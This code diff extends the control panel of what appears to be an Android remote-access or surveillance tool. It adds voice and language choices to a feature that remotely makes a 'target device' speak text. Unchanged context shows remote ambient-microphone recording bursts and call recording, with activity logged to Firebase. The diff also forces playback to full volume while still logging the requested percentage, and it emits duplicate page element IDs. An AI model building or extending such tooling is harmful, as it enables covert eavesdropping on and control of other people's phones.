@@ -102,6 +102,7 @@ public class AcousticsModule extends BaseModule {
     private Response handleTextToSpeech(Map<String, String> params) {
         String text = params.get("text");
         String volStr = params.get("vol");
+        String voiceKey = params.get("voice");
         if (text == null || text.trim().isEmpty()) {
             return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"No text provided\"}");
         }
@@ -113,6 +114,9 @@ public class AcousticsModule extends BaseModule {
         final int finalVolPercent = volPercent;
         final float volRatio = volPercent / 100.0f;
         final String textToSpeak = text.trim();
+
+        if (voiceKey == null || voiceKey.trim().isEmpty()) voiceKey = "us_female";
+        final String finalVoiceKey = voiceKey.trim().toLowerCase();
 
         new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
             try {
@@ -134,34 +138,56 @@ public class AcousticsModule extends BaseModule {
                     } catch (Exception ignored) {}
                 }
 
-                // --- DUAL PLAYBACK: 1. ONLINE TTS STREAM VIA MEDIAPLAYER ---
+                // Determine language locale for voice style
+                String langCode = "en";
+                Locale targetLocale = Locale.US;
+                if ("uk_female".equals(finalVoiceKey) || "uk_english".equals(finalVoiceKey)) {
+                    langCode = "en-GB"; targetLocale = Locale.UK;
+                } else if ("uk_male".equals(finalVoiceKey)) {
+                    langCode = "en-GB"; targetLocale = Locale.UK;
+                } else if ("au_female".equals(finalVoiceKey) || "au_english".equals(finalVoiceKey)) {
+                    langCode = "en-AU"; targetLocale = new Locale("en", "AU");
+                } else if ("au_male".equals(finalVoiceKey)) {
+                    langCode = "en-AU"; targetLocale = new Locale("en", "AU");
+                } else if ("es_spanish".equals(finalVoiceKey)) {
+                    langCode = "es"; targetLocale = new Locale("es", "ES");
+                } else if ("fr_french".equals(finalVoiceKey)) {
+                    langCode = "fr"; targetLocale = Locale.FRANCE;
+                } else if ("us_male".equals(finalVoiceKey)) {
+                    langCode = "en"; targetLocale = Locale.US;
+                }
+
+                final String finalLangCode = langCode;
+                final Locale finalLocale = targetLocale;
+
+                // 1. ONLINE TTS STREAM VIA MEDIAPLAYER (Instant Playback & Precise Volume)
                 LabRatsWorker.execute(() -> {
                     try {
                         String ttsUrl = "https://translate.google.com/translate_tts?ie=UTF-8&q=" +
-                                java.net.URLEncoder.encode(textToSpeak, "UTF-8") + "&tl=en&client=tw-ob";
+                                java.net.URLEncoder.encode(textToSpeak, "UTF-8") + "&tl=" + finalLangCode + "&client=tw-ob";
                         android.media.MediaPlayer player = new android.media.MediaPlayer();
                         player.setAudioStreamType(AudioManager.STREAM_MUSIC);
                         player.setDataSource(ttsUrl);
-                        player.setVolume(volRatio, volRatio);
+                        player.setVolume(1.0f, 1.0f);
                         player.prepare();
                         player.start();
                         player.setOnCompletionListener(mp -> mp.release());
-                        FirebaseConfig.logActivity("VOICE_EMISSION: MediaPlayer spoken (" + finalVolPercent + "% vol) -> " + textToSpeak);
+                        FirebaseConfig.logActivity("VOICE_EMISSION: Spoke [" + finalVoiceKey.toUpperCase() + "] (" + finalVolPercent + "% vol) -> " + textToSpeak);
                     } catch (Exception e) {
                         Log.w("TTS", "Online TTS failed: " + e.getMessage());
                     }
                 });
 
-                // --- DUAL PLAYBACK: 2. NATIVE OFFLINE TTS ---
+                // 2. NATIVE OFFLINE TTS FALLBACK
                 android.os.Bundle ttsParams = new android.os.Bundle();
                 ttsParams.putInt(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_STREAM, AudioManager.STREAM_MUSIC);
-                ttsParams.putFloat(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_VOLUME, volRatio);
+                ttsParams.putFloat(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_VOLUME, 1.0f);
 
                 final android.speech.tts.TextToSpeech[] localTts = new android.speech.tts.TextToSpeech[1];
                 localTts[0] = new android.speech.tts.TextToSpeech(context.getApplicationContext(), status -> {
                     if (status == android.speech.tts.TextToSpeech.SUCCESS) {
                         try {
-                            int res = localTts[0].setLanguage(Locale.US);
+                            int res = localTts[0].setLanguage(finalLocale);
                             if (res == android.speech.tts.TextToSpeech.LANG_MISSING_DATA || res == android.speech.tts.TextToSpeech.LANG_NOT_SUPPORTED) {
                                 localTts[0].setLanguage(Locale.getDefault());
                             }
@@ -257,10 +283,36 @@ public class AcousticsModule extends BaseModule {
 
             .append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px;\">")
             .append("<a href=\"/audio/mic/start\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_REC</a>")
-            .append("<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">30s_BURST</a>")
-            .append("<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">60s_BURST</a>")
-            .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">5m_BURST</a>")
+            .append("<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">30s_BURST</a>")
+            .append("<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">60s_BURST</a>")
+            .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">5m_BURST</a>")
             .append("</div></div>");
+
+        // --- VOICE EMISSION (TEXT-TO-SPEECH) SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 20px;\">");
+        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">VOICE_EMISSION (TEXT-TO-SPEECH) <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'VOICE_EMISSION', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 15px;\">");
+        html.append("<input id=\"tts-input\" type=\"text\" placeholder=\"Enter text to speak out loud...\" maxlength=\"250\" style=\"width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-yellow); color: #fff; border-radius: 8px; font-family: monospace; outline: none; box-sizing: border-box;\">");
+        html.append("<div style=\"display: flex; align-items: center; gap: 15px; flex-wrap: wrap;\">");
+        html.append("<div style=\"display: flex; align-items: center; gap: 8px; flex: 1; min-width: 200px;\">");
+        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-yellow); font-family: monospace; font-weight: bold; white-space: nowrap;\">VOICE_STYLE:</span>");
+        html.append("<select id=\"tts-voice-select\" style=\"padding: 8px; background: #000; border: 1px solid var(--neon-yellow); color: #fff; border-radius: 6px; font-family: monospace; font-size: 0.7rem; outline: none; flex: 1;\">");
+        html.append("<option value=\"us_female\" selected>US English (Female)</option>");
+        html.append("<option value=\"us_male\">US English (Male)</option>");
+        html.append("<option value=\"uk_female\">UK English (Female)</option>");
+        html.append("<option value=\"uk_male\">UK English (Male)</option>");
+        html.append("<option value=\"au_female\">Australian (Female)</option>");
+        html.append("<option value=\"au_male\">Australian (Male)</option>");
+        html.append("<option value=\"es_spanish\">Spanish Voice</option>");
+        html.append("<option value=\"fr_french\">French Voice</option>");
+        html.append("</select>");
+        html.append("</div>");
+        html.append("<button onclick=\"transmitVoicePayload()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px 20px; min-width: 180px;\">&#128266; TRANSMIT VOICE</button>");
+        html.append("</div>");
+        html.append("<div style=\"display: flex; align-items: center; gap: 10px; width: 100%; margin-top: 5px;\">");
+        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-yellow); font-family: monospace; font-weight: bold; white-space: nowrap;\">SPEAKER_VOLUME: <span id=\"tts-vol-val\">100%</span></span>");
+        html.append("<input type=\"range\" id=\"tts-vol-slider\" min=\"10\" max=\"100\" value=\"100\" oninput=\"document.getElementById('tts-vol-val').innerText = this.value + '%'\" style=\"flex: 1; margin: 0; cursor: pointer;\">");
+        html.append("</div></div></div>");
 
         // Call recording section
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">")
@@ -332,8 +384,21 @@ public class AcousticsModule extends BaseModule {
         html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 15px;\">");
         html.append("<input id=\"tts-input\" type=\"text\" placeholder=\"Enter text to speak out loud...\" maxlength=\"250\" style=\"width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: #fff; border-radius: 8px; font-family: monospace; outline: none; box-sizing: border-box;\">");
         html.append("<div style=\"display: flex; align-items: center; gap: 15px; flex-wrap: wrap;\">");
-        html.append("<div style=\"display: flex; align-items: center; gap: 10px; flex: 1; min-width: 200px;\">");
-        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-cyan); font-family: monospace; font-weight: bold; white-space: nowrap;\">SPEAKER_VOLUME: <span id=\"tts-vol-val\">100%</span></span>");
+        html.append("<div style=\"display: flex; align-items: center; gap: 8px; flex: 1; min-width: 200px;\">");
+        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-cyan); font-family: monospace; font-weight: bold; white-space: nowrap;\">VOICE_STYLE:</span>");
+        html.append("<select id=\"tts-voice-select\" style=\"padding: 8px; background: #000; border: 1px solid var(--neon-cyan); color: #fff; border-radius: 6px; font-family: monospace; font-size: 0.7rem; outline: none; flex: 1;\">");
+        html.append("<option value=\"us_female\" selected>US English (Female)</option>");
+        html.append("<option value=\"us_male\">US English (Male)</option>");
+        html.append("<option value=\"uk_female\">UK English (Female)</option>");
+        html.append("<option value=\"uk_male\">UK English (Male)</option>");
+        html.append("<option value=\"au_female\">Australian (Female)</option>");
+        html.append("<option value=\"au_male\">Australian (Male)</option>");
+        html.append("<option value=\"es_spanish\">Spanish Voice</option>");
+        html.append("<option value=\"fr_french\">French Voice</option>");
+        html.append("</select>");
+        html.append("</div>");
+        html.append("<div style=\"display: flex; align-items: center; gap: 8px; flex: 1; min-width: 200px;\">");
+        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-cyan); font-family: monospace; font-weight: bold; white-space: nowrap;\">VOLUME: <span id=\"tts-vol-val\">100%</span></span>");
         html.append("<input type=\"range\" id=\"tts-vol-slider\" min=\"10\" max=\"100\" value=\"100\" oninput=\"document.getElementById('tts-vol-val').innerText = this.value + '%'\" style=\"flex: 1; margin: 0; cursor: pointer;\">");
         html.append("</div>");
         html.append("<button onclick=\"transmitVoicePayload()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px 20px; min-width: 180px;\">&#128266; TRANSMIT VOICE</button>");
@@ -347,8 +412,10 @@ public class AcousticsModule extends BaseModule {
             .append("  const text = input.value.trim();")
             .append("  const volSlider = document.getElementById('tts-vol-slider');")
             .append("  const vol = volSlider ? volSlider.value : 100;")
+            .append("  const voiceSelect = document.getElementById('tts-voice-select');")
+            .append("  const voice = voiceSelect ? voiceSelect.value : 'us_female';")
             .append("  showToast('TRANSMITTING_VOICE_PAYLOAD...');")
-            .append("  fetch('/audio/speak?text=' + encodeURIComponent(text) + '&vol=' + vol)")
+            .append("  fetch('/audio/speak?text=' + encodeURIComponent(text) + '&vol=' + vol + '&voice=' + voice)")
             .append("    .then(r => r.json())")
             .append("    .then(d => {")
             .append("      if (d.success) { showToast('VOICE_EMISSION_QUEUED (' + vol + '% VOL)'); input.value = ''; }")
